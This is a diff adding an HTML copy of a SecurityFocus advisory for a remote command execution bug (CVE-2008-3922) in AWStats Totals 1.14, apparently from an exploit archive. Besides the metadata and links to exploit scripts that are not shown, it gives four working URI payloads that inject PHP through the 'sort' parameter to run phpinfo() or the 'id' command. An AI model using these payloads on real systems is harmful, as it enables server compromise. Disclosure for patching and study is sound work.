@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid30856<p><b><span style="font-size: 18pt;">AWStats Totals 'sort' Parameter Remote Command Execution Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/30856/info">info</a><br><a href="http://www.securityfocus.com/bid/30856/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/30856/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/30856/solution">solution</a><br><a href="http://www.securityfocus.com/bid/30856/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				30856
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2008-3922<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 26 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 26 2011 05:31AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Elliot Kendall
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Telartis AWStats Totals  1.14<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Telartis AWStats Totals  1.15<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x31000/30856/30856.rb">#exploit_30856.rb</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x31000/30856/30856.php">#exploit_30856.php</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example URIs are available. Note that these example URIs require that magic quotes be disabled, but will work on all versions of PHP.<br/><br/>This example will display phpinfo():<br/><br/>http://www.example.com/some/path/awstatstotals.php?sort=%22%5d%2ephpinfo%28%29%2eexit%28%29%2e%24a%5b%22<br/><br/>This example will run the 'id' command on the target system:<br/><br/>http://www.example.com/some/path/awstatstotals.php?sort=%22%5d%2epassthru%28%27id%27%29%2eexit%28%29%2e%24a%5b%22<br/><br/>The following example URIs require a version of PHP that parses function calls inside strings (5+, some versions of 4?), but will work if magic quotes are enabled.<br/><br/>This example will display phpinfo():<br/><br/>http://www.example.com/some/path/awstatstotals.php?sort=%7b%24%7bphpinfo%28%29%7d%7d%7b%24%7bexit%28%29%7d%7d<br/><br/>This example will run the 'id' command on the target system:<br/><br/>http://www.example.com/some/path/awstatstotals.php?sort=%7b%24%7bpassthru%28chr(105)%2echr(100)%29%7d%7d%7b%24%7bexit%28%29%7d%7d<br/><br/><br/>The following exploit code is available:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/30856.rb">/data/vulnerabilities/exploits/30856.rb</a></li>
+<li><a href="/data/vulnerabilities/exploits/30856.php">/data/vulnerabilities/exploits/30856.php</a></li>
+</ul>
+</div>
